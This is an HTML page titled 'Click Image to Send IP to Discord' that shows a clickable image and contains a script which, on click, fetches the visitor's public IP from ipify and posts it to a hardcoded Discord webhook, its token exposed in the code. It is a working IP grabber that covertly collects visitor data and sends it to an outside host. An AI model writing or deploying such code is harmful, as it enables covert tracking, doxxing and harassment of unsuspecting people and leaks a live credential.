<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click Image to Send IP to Discord</title>
</head>
<body>

<!-- Clickable Image -->
<img src="https://i.guns.lol/hWsVB.jpeg" 
     alt="Clickable Image" 
     id="clickable-image" 
     style="cursor: pointer; width: 300px;">

<script>
    const webhookUrl = 'https://discord.com/api/webhooks/1403073369410244739/DMBo14Lg-4D3UbY-xrPfChglFsi1WP___5vpBDsfMZfm40VqHX8V1Bxe_90TmEWfolDI';

    // Get IP address using public API
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch (err) {
            console.error('Failed to get IP:', err);
            return 'Unknown IP';
        }
    }

    // On image click, get IP and send to Discord
    document.getElementById('clickable-image').addEventListener('click', async () => {
        const ip = await getIP();
        const message = `Visitor IP: ${ip}`;

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: message })
        })
        .then(response => {
            if (response.ok) {
                console.log('IP sent to Discord!');
            } else {
                console.error('Failed to send:', response.status);
            }
        })
        .catch(error => {
            console.error('Fetch error:', error);
        });
    });
</script>

</body>
</html>
